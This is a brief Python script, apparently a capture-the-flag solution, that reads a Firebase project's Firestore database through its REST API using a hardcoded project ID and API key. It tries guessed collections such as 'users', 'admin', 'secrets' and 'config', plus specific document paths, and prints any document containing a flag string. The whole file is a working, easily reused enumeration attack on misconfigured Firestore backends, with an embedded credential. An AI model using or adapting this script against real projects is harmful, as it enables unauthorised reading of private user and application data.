import urllib.request
import json

project_id = "business-pro-d657d"
api_key = "AIzaSyDH1sF1FEasvvisSp-B8m2ETk2N5L4rZq8"

def query_url(url):
    try:
        with urllib.request.urlopen(url) as response:
            return json.loads(response.read().decode())
    except:
        return None

def search_doc(doc):
    s = json.dumps(doc)
    if "flag{" in s:
        print(f"FOUND FLAG IN: {doc.get('name', 'unknown')}")
        print(s)

# Try common collections
collections = ["products", "sales", "users", "admin", "secrets", "flags", "config", "logs"]
for col in collections:
    url = f"https://firestore.googleapis.com/v1/projects/{project_id}/databases/(default)/documents/{col}?key={api_key}"
    res = query_url(url)
    if res and "documents" in res:
        for doc in res["documents"]:
            search_doc(doc)

# Try specific documents
docs = ["admin/config", "secrets/flag", "system/settings"]
for d in docs:
    url = f"https://firestore.googleapis.com/v1/projects/{project_id}/databases/(default)/documents/{d}?key={api_key}"
    res = query_url(url)
    if res:
        search_doc(res)
